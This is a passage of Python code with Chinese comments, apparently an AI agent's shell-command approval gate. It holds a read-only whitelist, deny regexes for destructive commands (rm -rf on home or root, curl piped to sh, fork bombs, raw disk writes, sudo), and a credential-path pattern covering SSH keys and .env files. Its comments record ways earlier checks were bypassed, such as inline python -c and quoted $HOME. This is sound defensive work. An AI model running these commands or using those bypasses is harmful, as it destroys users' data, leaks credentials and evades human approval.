                        # 🔴 `+` 形式一次喂多个文件 ⇒ 实测
                        # `find . -type f -exec uniq {} +` 把第二个文件当输出，
                        # 一个 20 字节的文件真被覆盖成 4 字节。
                        # 这类命令"参数一多就变成写"，不许进 -exec。
                        return Verdict(
                            False,
                            f"find -exec 跑 {body[0]}，多给几个文件就会写",
                        )
                    inner = classify(" ".join(shlex.quote(t) for t in body))
                    if not inner.readonly:
                        return Verdict(
                            False,
                            f"find -exec 跑的 `{' '.join(body)[:40]}` 不是只读",
                        )
                continue
            if _FIND_UNSAFE.search(seg):
                return Verdict(False, "find 带了会写/执行的选项")
            continue
        if base == "git":
            if _GIT_DANGEROUS_GLOBAL.search(seg):
                return Verdict(False, "git 带了能执行任意命令的全局选项")
            rest = _segment(tokens, position + 1)
            if rest and all(tok in _PURE_QUERY_FLAGS for tok in rest):
                continue  # `git --version` / `git --help`
            sub = _first_argument(tokens, position)
            if sub is None:
                return Verdict(False, "git 没有子命令，判不出")
            if sub not in GIT_SAFE:
                return Verdict(False, f"git {sub} 不在只读子命令里")
            if sub == "config":
                # 白名单制：必须明确带读取开关，且不带任何写开关。
                # 实测（2026-11-03）`--get/--get-all/--list` 跑完 `.git/config`
                # 和 `~/.gitconfig` 的 md5 都不变；裸 `git config x y`、
                # `--add`、`--replace-all`、`--unset` 四条逐条单跑都真改了文件。
                if _GIT_CONFIG_WRITE.search(seg):
                    return Verdict(False, "git config 带了会改配置的开关")
                if not _GIT_CONFIG_READ_ONLY.search(seg):
                    return Verdict(False, "git config 没带读取开关，可能是在写配置")
                continue
            if sub == "symbolic-ref":
                # 🔴 `git symbolic-ref HEAD refs/heads/x` **不带任何选项就在写** ——
                # 实测 `.git/HEAD` 从 `ref: refs/heads/main` 真被改成
                # `ref: refs/heads/evil`（等于静默切分支，用户下一次 commit 落错地方）。
                # `_positionals` 的第一个是子命令本身（`symbolic-ref`），第二个是
                # 要查的 ref（`HEAD`）⇒ 到 2 个都还是查询，第 3 个才是"要写成什么"。
                if len(_positionals(tokens, position)) > 2:
                    return Verdict(False, "git symbolic-ref 带了目标，是在改 HEAD")
            if _GIT_UNSAFE_FLAGS.search(seg):
                return Verdict(False, f"git {sub} 带了会改东西的选项")
            if sub in _GIT_SHORT_FLAG_WRITERS and _GIT_UNSAFE_SHORT_FLAGS.search(seg):
                return Verdict(False, f"git {sub} 带了会改东西的短选项")
            # `git tag v9.9.9` / `git branch feature` —— **不带选项也在写**：
            # 多一个位置参数就是"创建"。比 `-d` 更隐蔽，看着像查询。
            if sub in _GIT_CREATE_BY_POSITIONAL and not _GIT_LIST_FLAGS.search(seg):
                # positional[0] 是子命令本身，再多就是在创建。
                # `-C` 的值已经在 `_positionals` 里扣掉了。
                if len(_positionals(tokens, position)) > 1:
                    return Verdict(False, f"git {sub} 带了名字，是在创建而不是查询")
            continue
        # 「会一直刷不退出」要在各自的只读门**之前**判 —— `netstat` 走
        # `_READONLY_FLAG_ONLY` 那条会直接 `continue`，放在后面就永远到不了。
        poll_gate = _POLL_INTERVAL_HANGS.get(base)
        if poll_gate is not None and poll_gate.search(seg):
            # 实测 `vm_stat 1` / `netstat -w 1` / `netstat 1` 都 HANGS>7s
            #（每秒刷一行、永不退出）⇒ 放行等于让整轮挂到超时，用户什么都收不到。
            return Verdict(False, f"{base} 带了刷新秒数，会一直刷不退出")
        # 🔴 第 16 轮：只在带了某个只读选项时才算「看一眼」的那几个（见 `_READONLY_ONLY_WITH_FLAG`）。
        # 放在子命令表之前判：`screen -ls` 的 `-ls` 是选项不是子命令，走子命令那条会判「没有子命令」。
        spec = _READONLY_FLAG_ONLY.get(base)
        if spec is not None:
            why = _flag_only_ok(tokens, position, spec)
            if why:
                return Verdict(False, f"{base} {why}")
            if base == "pmset":
                # `-g pslog` 这类是持续输出，不是取一次值 ——
                # 见 `_PMSET_STREAMING_GETTERS`（7 个实测 HANGS，另 19 个实测会退）。
                getter = _positionals(tokens, position)
                if getter and getter[0] in _PMSET_STREAMING_GETTERS:
                    return Verdict(False, "pmset 这个取值是持续输出，不会自己退出")
            continue
        gated = SUBCOMMAND_GATED.get(base)
        if gated is not None:
            # 🔴 `--version` / `--help` 这类纯查询选项要单独认。
            # 子命令集里列了 `"--version"` 但那是**死票**：`_first_argument`
            # 把所有 `startswith("-")` 都跳过，永远匹配不到，必然走到
            # "没有子命令，判不出" ⇒ `npm --version` 被要求审批。
            rest = _segment(tokens, position + 1)
            if rest and all(tok in _PURE_QUERY_FLAGS for tok in rest):
                continue
            sub = _first_argument(tokens, position)
            if sub is None:
                return Verdict(False, f"{base} 没有子命令，判不出")
            if sub not in gated:
                return Verdict(False, f"{base} {sub} 不在只读子命令里")
            if base == "tmux" and _TMUX_FORMAT_RUNS_SHELL.search(seg):
                # 🔴 `#(...)` 是 tmux 的 job 语法 = 跑 shell 命令。
                # 实测 `set-option -g status-right '#(touch F)'` 真建了文件
                # （3.6a 的 display-message/list-panes 不展开，但判据不靠版本兜底）。
                return Verdict(False, "tmux 的格式串里有 #(…)，那会跑 shell 命令")
            if base == "tmux" and sub == "capture-pane" and not re.search(
                    r"(^|\s)-[a-zA-Z]*p[a-zA-Z]*(\s|$)", seg):
                return Verdict(False, "tmux capture-pane 没带 -p，是在写 buffer 而不是看")
            if base == "log":
                # 🔴 子命令表只判「会不会改东西」，这里补「会不会回不来」——
                # 见 `_LOG_BOUNDED` 的红字（stream 永不退、--pager 等按键、
                # 不带范围的 show 实测 15 秒吐了 1.1GB）。
                if sub in _LOG_NEVER_BOUNDED:
                    return Verdict(False, f"log {sub} 会一直刷不退出")
                if _LOG_PAGER.search(seg):
                    return Verdict(False, "log 带了 --pager，会停在分页器里等按键")
                if sub == "show" and not _LOG_BOUNDED.search(seg):
                    return Verdict(
                        False, "log show 没限定时间范围，会把整个日志库拉回来"
                    )
            if base in ("pip", "pip3") and sub == "config":
                # 🔴 第二级：只放看的。`set`/`unset`/`edit` 会改 pip 源。
                second = _positionals(tokens, position)
                if len(second) < 2 or second[1] not in ("list", "get", "debug"):
                    return Verdict(False, "pip config 只有 list/get/debug 算看一眼")
            continue
        if base in _VERSION_ONLY:
            rest = _segment(tokens, position + 1)
            if rest and all(tok in _PURE_QUERY_FLAGS for tok in rest):
                continue
            # `go version` / `cargo version`：版本是子命令不是选项。
            # 只认**单独一个** `version`，多一个词就不算（`go version -m <二进制>` 读文件、
            # 形状更复杂，留给审批）。
            if rest and len(rest) == 1 and rest[0] in _VERSION_SUBCOMMANDS:
                continue
            return Verdict(False, f"{base} 只在问版本时算看一眼，别的要问")
        if base in _QUERY_ONLY_WHEN_BARE:
            # 只允许选项（`date -u`、`uname -a`），不允许位置参数（那是"设置"）。
            # 🔴 只看这一段：实测 `date; ls foo` 里 `ls` 的 `foo` 被算成 `date`
            # 的参数 ⇒ 判成「date 带了参数，可能是在设置」而弹卡。
            if _positionals(tokens, position):
                return Verdict(False, f"{base} 带了参数，可能是在设置而不是查询")
            continue
        flag_gate = _WRITE_FLAG_GATED.get(base)
        if flag_gate is not None and flag_gate.search(seg):
            return Verdict(False, f"{base} 带了会写文件的选项")
        if base in _POSITIONAL_WRITERS:
            if len(_positionals(tokens, position)) > 1:
                return Verdict(False, f"{base} 的第二个位置参数是输出文件")
        hang_gate = _HANGS_WITHOUT_FLAG.get(base)
        if hang_gate is not None and not hang_gate.search(seg):
            # 不是"会改东西"，是"会挂住" —— 放行它等于让整轮跑到超时才被杀，
            # 用户什么都收不到。弹卡片反而是对的：用户至少知道卡在哪一步。
            return Verdict(False, f"{base} 不带 -l <次数> 会一直挂着不退出")
        if base not in READERS:
            # 白名单制：不认识就问。多问一次 < 漏放一次。
            return Verdict(False, f"不在只读命令白名单里：{base}")
    return Verdict(True, "全部是只读命令")


# ──────────────────────────────────────────────────────────────────────────
# 不可批准的红线
# ──────────────────────────────────────────────────────────────────────────
#
# 2026-11-03 端到端回归实测：`python3 -c "import os; os.remove(…)"` 弹卡片 →
# 用户点「同意」→ **文件真被删了**，而 `Bash(rm:*)` 的 deny 根本没触发
# （它只认命令里写出的 `rm`）。也就是说"点一次同意 = 一次任意代码执行"。
#
# C 端产品不能这样：用户在手机上点错一下，不该造成不可逆损失。
# 所以这些操作**连批准都不放行** —— 想做就自己去电脑前做。
#
# 判据是"不可逆 + 范围大"，不是"危险"：
#   - 改文件可逆（有 git、有备份），所以不在这里
#   - 删家目录 / 推代码到远端 / 把凭据发出去，做了就收不回来

# 「目标就是根或家目录本身」的所有写法。`rm -rf` 和 `find … -delete` 两条红线
# 共用这一个片段 —— 原来各写一份，第 16 轮实测发现两份漏的不是同一批
# （`find` 那份漏了 `/Users/<名字>`、`"$HOME"`、`-execdir rm`）。
#
# 每一项的理由：
#   `~` `$HOME` `${HOME}`      家目录，可带引号、可带尾斜杠、可带 `/.`（`rm -rf ~/.`
#                              本机实测被 rm 自己拒掉 —— "." may not be removed ——
#                              但判据不靠它兜底）
#   `/`                        根
#   `/Users/<名字>` `/home/<名字>`  家目录的绝对路径写法，等价于 `~`
#   `/Users` `/home`           所有人的家目录
# 🔴 后面**不许再跟路径段**：`(?![^\s;&|]*/[^\s;&|])` 保证 `~/code/build`、
# `/Users/x/codes/y/build` 这类"家目录下面的某个目录"不被当成家目录本身，
# 否则日常 `rm -rf ~/proj/build` 会被拒（见测试里的 NORMAL_CLEANUP 阳性对照）。
_HOME_OR_ROOT = (
    r"[\"']?"                                    # 可选的开引号
    r"(?:~|\$HOME|\$\{HOME\}|/Users/[^/\s\"';&|]+|/home/[^/\s\"';&|]+"
    r"|/Users|/home|/)"
    r"(?:/\.?|/\*|\*)?"                          # 尾斜杠 / `/.` / `/*` / `*`
    r"[\"']?"                                    # 可选的闭引号
    r"(?![^\s;&|]*/[^\s;&|])"                    # 后面不许再有路径段
)

_NEVER_APPROVABLE = (
    # 任意代码执行：绕开所有命令级判据
    (re.compile(r"\b(python3?|node|ruby|perl|php|osascript|deno|bun)\b\s+(-c|-e|-r|--eval)"),
     "用解释器跑内联代码等于绕过所有限制"),
    (re.compile(r"\b(python3?|node|ruby|perl|sh|bash|zsh)\b[^|;&\n]*<<"),
     "用 heredoc 喂脚本等于绕过所有限制"),
    (re.compile(r"\|\s*(sh|bash|zsh|python3?|node)\b"),
     "把输出管进解释器等于绕过所有限制"),
    (re.compile(r"\beval\b|\bexec\b"),
     "eval/exec 等于绕过所有限制"),
    # 不可逆且范围大
    # 🔴 只匹配**目标就是根或家目录本身**（`/`、`~`、`$HOME`、`/*`、`~/*`）。
    # 原来是 `.*(/|~|\$HOME)` —— 任何带 `/` 的 rm -rf 都中（`rm -rf build/`、`rm -rf /tmp/x`）。
    # 当它只在"点同意"时查无所谓；2026-11-04 起它在**全授权下也生效**（钩子里先于 TRUSTED 判），
    # 那样连清个构建目录都会被拒。工作目录内的删除由路径检查管，这条只管灾难级的。
    # 🔴 第 16 轮：上面那版实测漏了 7 种写法（主会话 2026-11-07 实测）：
    #   rm -rf ~/ (尾斜杠)、rm -rf $HOME/、rm -r -f ~ (选项拆开)、rm -fr ~/、
    #   find ~ -delete、find $HOME -delete、find ~/ -delete
    # 前几个当时靠 `policy.ALWAYS_DENY` 的 `Bash(rm:*)` 兜着，而这一轮要收窄那条
    # （工作目录里删普通文件被误拒）⇒ 兜底一撤就真漏；`find ~ -delete` 当时点同意就会执行。
    # 🔴 第 16 轮 P1（接手重做）又打穿了 7 种写法，逐条在真 shell 上验过能删：
    #   `rm -rf "$HOME"` / `'$HOME'`  —— 引号一包，要求 `$HOME` 前后是空白的正则就配不上。
    #                                   沙盒里把 HOME 指到临时目录实测**目录真没了**。
    #   `rm -Rf ~` / `rm -R -f $HOME` —— BSD rm 的 `-R` 和 `-r` 等价（实测 `rm -Rf` 真删了
    #                                   带子目录的树），而原正则只写了小写 `r`。
    #   `rm -rf /Users/<名字>`         —— 家目录的绝对路径就是家目录本身；原正则只认
    #                                   `/Users` 和 `/Users*`，带具体名字就漏。
    #   `find "$HOME" -delete` / `find /Users/<名字> -delete`  同上两类。
    #   `find ~ -execdir rm -rf {} +`  —— 实测哨兵目录整棵没了，原正则只认 `-exec\s+rm`。
    #   （`rm --recursive --force ~` 本机 BSD rm 回 "illegal option"，但判据不靠
    #     "这台机器恰好不支持"兜底 —— 和 `lsof -D`、`sysctl -w` 同一条纪律，一并认。）
    #
    # 判据仍然只打**目标就是根或家目录本身**：家目录**下面**的项目目录不在内，
    # 否则 `rm -rf ~/code/proj/build` 这种日常清理会被堵死（见测试里的阳性对照）。
    (re.compile(
        r"\brm\b(?=(?:[^;&|]*\s(?:-[a-zA-Z]*[rR]|--recursive)))"
        r"(?=(?:[^;&|]*\s(?:-[a-zA-Z]*f|--force)))"
        r"[^;&|]*\s" + _HOME_OR_ROOT + r"(?=\s|$|;|&|\|)"),
     "递归删除根目录或家目录"),
    (re.compile(
        r"\bfind\s+" + _HOME_OR_ROOT + r"(?=\s)"
        r"[^;&|]*\s-(?:delete\b|exec(?:dir)?\s+rm\b|ok(?:dir)?\s+rm\b)"),
     "把根目录或家目录整个删掉"),
    (re.compile(r"\bgit\s+push\b"),
     "把代码推到远端"),
    (re.compile(r"\bgit\s+reset\s+--hard\b|\bgit\s+clean\s+-[a-z]*f"),
     "丢弃本地改动"),
    (re.compile(r"\bsudo\b|\bdoas\b"),
     "提权"),
    (re.compile(r"\bdd\b.*\bof=/dev/"),
     "裸写磁盘"),
    (re.compile(r":\(\)\s*\{.*\}\s*;?\s*:"),
     "fork 炸弹"),
    (re.compile(r"\bkubectl\s+delete\b|\bhelm\s+(delete|uninstall)\b"),
     "删线上资源"),
    (re.compile(r"\b(curl|wget)\b.*\|\s*(sh|bash)"),
     "下载直接执行"),
    (re.compile(r"\bchmod\s+-R\s+777\b|\bchown\s+-R\b.*\s/\s*$"),
     "递归改权限"),
    (re.compile(r"\bdiskutil\s+(erase|reformat)|\bmkfs\b"),
     "格式化磁盘"),
    (re.compile(r"\blaunchctl\s+(bootout|unload)\b.*\bcom\.apple\b"),
     "卸载系统服务"),
    (re.compile(r"\bdefaults\s+(write|delete)\b"),
     "改系统设置"),
)


def _flag_only_ok(tokens: list, start: int, spec: dict) -> str:
    """这一段是不是**只有**被认可的只读 token。返回空串 = 是；否则返回要问的原因。

    见 `_READONLY_FLAG_ONLY` 的红字：判据是「整段白名单」，不是「出现过某个选项」。
    """
    seg = _segment(tokens, start)[1:]
    allow = spec.get("flags")
    allow_re = spec.get("allow_re")
    deny_re = spec.get("deny_re")
    values = spec.get("values") or set()
    args = 0
    saw_flag = False
    i = 0
    while i < len(seg):
        tok = seg[i]
        if tok.startswith("-") and tok != "-":
            name = tok.split("=", 1)[0]
            if deny_re is not None and deny_re.match(name):
                return "带了会改东西的选项"
            ok = (allow is not None and name in allow) or \
                 (allow_re is not None and bool(allow_re.match(name)))
            if not ok:
                return "带了不认识的选项，可能是在改设置"
            saw_flag = True
            i += 2 if name in values and "=" not in tok else 1
            continue
        arg_re = spec.get("arg_re")
        if arg_re is not None and not arg_re.match(tok):
            return "带了不认识的参数，可能是在改设置"
        args += 1
        if args > int(spec.get("max_args") or 0):
            return "带了多余的参数，可能是在改设置"
        i += 1
    if allow is not None and allow and not saw_flag:
        return "没带只读选项，可能是在改设置"
    need = spec.get("need")
    if need is not None and not need.search(" ".join(_segment(tokens, start))):
        return "没带限定次数/范围的选项，可能会一直跑或者拉回整份清单"
    return ""


# ── 第 16 轮：凭据路径红线 ──
#
# 🔴 **这条必须和「放开读范围」同一轮上**。主会话 2026-11-07 实测：目录外读凭据现在
# **只靠工作目录那道边界**挡着 —— `cat ~/.ssh/id_rsa` 的只读判定是 True、红线为空。
# 也就是说读范围一放开，它就直接放行，而回复会进飞书 = 把私钥发布出去。
#
# 为什么放在 `never_approvable`（连点同意都不许）而不是「弹卡问一下」：
# 手机上点错一下就把私钥发到飞书，不可逆。`policy.ALWAYS_DENY` 的 `Read(//**/...)`
# 只管 Read 工具，管不到 Bash 里的 `cat`（命令里的路径是运行时才知道的）。
_CRED_PATHS = re.compile(
    r"(^|[\s=\"'(:])"                       # 词首：空白、等号、引号、括号、冒号
    r"(~|\$HOME|\$\{HOME\}|/Users/[^/\s]+|/home/[^/\s]+|/root|/etc)?"   # 可选的家目录前缀
    r"/?\.?(ssh/|aws/|gnupg/|docker/config|kube/config|netrc|npmrc|pypirc"
    r"|git-credentials|keychain|Keychains/)"
    r"|(^|[\s=\"'(:/])\.env(\.[A-Za-z0-9_.-]+)?(\s|$|[\"';)])"          # .env / .env.local
    r"|\.(pem|p12|pfx|jks)(\s|$|[\"';)])"                                  # 证书私钥
    r"|\bid_(rsa|dsa|ecdsa|ed25519)\b"
    r"|/etc/(shadow|master\.passwd|sudoers)"
    # 钥匙串本体（`login.keychain-db`）和「在配置目录里搜密码」这两种实测漏过，补上
    r"|\.keychain(-db)?\b"
    r"|(?i:password|passwd|secret|token|credential|api[_-]?key)[^;&|]*\s(~|\$HOME|/Users/|/home/)"
    r"|\s-r[a-zA-Z]*\s+[^;&|]*(~|\$HOME)/\.(config|aws|ssh|gnupg)\b",
    re.I,
)


def _touches_credentials(command: str) -> str:
    """这条命令碰到了凭据文件吗。返回原因，空串 = 没碰到。

    只看「命令文本里有没有凭据路径的形状」—— 不做路径解析（运行时才知道真路径），
    宁可多拦：`cat ~/.ssh/config` 也拦住（里面有主机名和私钥路径）。
    """
    if not command:
        return ""
    return "读密钥 / 凭据文件" if _CRED_PATHS.search(command) else ""


def never_approvable(command: str) -> str:
    """这条命令是不是"连点同意都不许做"。返回原因，空串表示可以批准。

    给审批层用：`ApprovalGate.approve` 在写 `.ok` 之前问一次。
    这样用户在手机上点错也不会造成不可逆损失。
    """
    text = (command or "").strip()
    if not text:
        return ""
    cred = _touches_credentials(text)
    if cred:
        return cred
    for pattern, reason in _NEVER_APPROVABLE:
        if pattern.search(text):
            return reason
    return ""
